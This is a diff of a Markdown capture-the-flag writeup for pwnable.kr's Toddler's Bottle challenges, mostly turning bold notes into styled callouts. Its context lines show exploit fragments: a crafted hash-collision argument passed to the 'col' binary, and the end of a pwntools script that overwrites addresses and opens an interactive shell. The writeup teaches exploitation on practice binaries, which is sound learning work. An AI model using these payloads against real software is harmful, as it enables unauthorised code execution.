@@ -16,7 +16,8 @@ description: "Walkthroughs for fd, collision, bof, flag, and passcode challenges
 ctf_category: Pwn
 ---
 
-**[pwnable.kr](https://pwnable.kr) is a wargame site which provides various pwn challenges regarding system exploitation. The main purpose of pwnable.kr is having "fun" while improving one's hacking skills ;)**
+> [pwnable.kr](https://pwnable.kr) is a wargame site which provides various pwn challenges regarding system exploitation. The main purpose of pwnable.kr is having "fun" while improving one's hacking skills ;)
+{: .prompt-info }
 
 Toddler's Bottle is a section of easy-ish challenges. This writeup contains solutions to almost all of the challenges in that section.
 
@@ -41,7 +42,8 @@ good job :)
 col@ubuntu:~$ ./col `python -c 'print "\xe8\x05\xd9\x1d" + "\x01"*16'`
 ````
 
-**Note:** `0x1dd905e8 + 4*0x01010101 = 0x21dd09ec`
+> **Note:** `0x1dd905e8 + 4*0x01010101 = 0x21dd09ec`
+{: .prompt-info }
 
 ## bof
 
@@ -438,4 +440,5 @@ r.sendline(shell_address + "A"*12 + p32(int(stack_address, 16) + 12) + p32(int(h
 r.interactive()
 ```
 
-**Go through other [writeups](/writeups/) for more such fun challenges.**
+> Go through other [writeups](/writeups/) for more such fun challenges.
+{: .prompt-tip }
